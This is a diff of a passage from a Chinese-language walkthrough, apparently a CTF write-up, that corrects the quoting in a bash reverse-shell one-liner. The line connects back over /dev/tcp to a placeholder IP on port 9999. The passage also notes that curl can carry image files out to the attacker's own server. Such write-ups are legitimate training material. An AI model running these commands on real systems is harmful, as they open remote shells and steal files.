@@ -214,7 +214,7 @@ if (isset($_GET['DATA'])) {
 2. 反弹shell
 这里的反弹shell只能反弹回一个没有回显的shell。
 解决办法很多，可以考虑二次反弹一个完整的shell，或者绕过黑名单。
-`bash -c "bash -i < /dev/tcp/ip/9999 1<&0 2<&0""`
+`bash -c "bash -i < /dev/tcp/ip/9999 1<&0 2<&0"`
 
 3. 反弹shell后的文件获取
 内置环境有`curl`，可以将图片外带到自己的服务器。
